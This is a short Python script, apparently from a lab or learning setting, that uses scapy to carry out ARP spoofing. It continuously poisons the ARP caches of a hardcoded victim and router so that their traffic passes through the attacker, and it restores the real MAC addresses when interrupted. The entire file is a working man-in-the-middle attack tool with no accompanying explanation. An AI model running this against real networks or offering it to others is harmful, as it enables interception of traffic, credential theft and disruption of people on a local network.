#!/usr/bin/python

import scapy.all as scapy

victim_ip = "192.168.33.30"
router_ip = "192.168.121.1"


def restore_defaults(dest, source):
    # getting the real MACs
    target_mac = get_mac(dest) # 1st (router), then (windows)
    source_mac = get_mac(source)
    # creating the packet
    packet = scapy.ARP(op=2, pdst=dest, hwdst=target_mac, psrc=source, hwsrc=source_mac)
    # sending the packet
    scapy.send(packet, verbose=False)


def get_mac(ip):
    # request that contain the IP destination of the target
    request = scapy.ARP(pdst=ip)
    # broadcast packet creation
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    # concat packets
    final_packet = broadcast / request
    # getting the response
    answer = scapy.srp(final_packet, iface="eth1", timeout=2, verbose=False)[0]
    # getting the MAC (its src because its a response)
    mac = answer[0][1].hwsrc
    return mac


# we will send the packet to the target by pretending being the spoofed
def spoofing(target_ip, spoofed_ip):
    # getting the MAC of the target
    mac = get_mac(target_ip)
    # generating the spoofed packet modifying the source and the target
    packet = scapy.ARP(op=2, hwdst=mac, pdst=target_ip, psrc=spoofed_ip)
    # sending the packet
    scapy.send(packet, verbose=False)


def main():
    try:
        while True:
            spoofing(router_ip, victim_ip)
            spoofing(victim_ip, router_ip)
    except KeyboardInterrupt:
        print("[!] Process stopped. Restoring defaults .. please hold")
        restore_defaults(router_ip, victim_ip)
        restore_defaults(victim_ip, router_ip)
        exit(0)


if __name__ == "__main__":
    main()
